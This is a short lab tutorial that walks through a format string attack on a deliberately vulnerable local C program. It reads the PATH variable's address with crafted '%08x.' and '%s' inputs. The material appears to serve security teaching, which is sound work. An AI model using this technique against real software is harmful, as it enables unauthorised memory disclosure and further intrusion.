## Format string attack: arbitrary read

This example demonstrates arbitrary memory location read
using format string attack.

1. Compile included program to determine where PATH is when 
running our vulnerable program:
   * See ../../common/getenv.c
2. Compile our vulnerable program:
   * gcc -mpreferred-stack-boundary=2 -g -o fsa fsa.c 
3. Run getenvaddr to determine the memory address we're going 
to read with format string attack:
   * ./getenvaddr PATH fsa
4. Run our vulnerable program with a suitably crafted input to 
determine how far we need to move the stack pointer before treating 
memory as string:
   * ./fsa $(printf "AAAA").$(python -c "print('%08x.') * 20")
   * Note how many bytes there are to 0x41414141 (count)
5. Run our vulnerable program with count * '%08x.' + %s to read memory 
address we found with getenvaddr:
   * ./fsa $(printf \xff\xff\xff\xff).$(python -c "print('%08x.' * count + '%s'")
   * Note \xff\xff\xff\xff should be replaced with the memory address 
we found with getenvaddr in litte endian (getenvaddr will print the address 
in big endian)
   * This should print the PATH variable when our vulnerable program
was executed

--

Notes:
* In the examples we're doing everything in main.  To 'force' the 
format string attack to work, we have to introduce the items on 
the stack using strcpy or some other method.  In the real world the 
unsanitised format string would probably be passed to another function 
which would place it on the stack. 
